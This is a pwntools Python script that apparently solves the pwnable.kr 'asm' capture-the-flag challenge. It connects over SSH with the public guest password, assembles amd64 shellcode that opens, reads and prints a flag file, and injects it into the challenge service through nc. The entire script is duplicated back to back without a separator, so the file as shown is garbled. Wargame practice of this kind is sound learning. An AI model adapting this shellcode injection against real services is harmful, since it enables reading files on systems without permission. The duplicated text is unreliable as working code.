from pwn import *

context.arch = "amd64"
context.os = "linux"

sh =  connection = ssh('asm','pwnable.kr',password='guest',port=2222)

fname = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
shellcode = asm(
         shellcraft.open(fname) +
         shellcraft.read('rax','rsp',70) +
         shellcraft.write(1,'rsp',70) +
         shellcraft.exit(0)
         )

io = sh.process(["nc","0.0.0.0","9026"])
io.sendline(shellcode)
io.interactive()from pwn import *

context.arch = "amd64"
context.os = "linux"

sh =  connection = ssh('asm','pwnable.kr',password='guest',port=2222)

fname = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
shellcode = asm(
         shellcraft.open(fname) +
         shellcraft.read('rax','rsp',70) +
         shellcraft.write(1,'rsp',70) +
         shellcraft.exit(0)
         )

io = sh.process(["nc","0.0.0.0","9026"])
io.sendline(shellcode)
io.interactive()
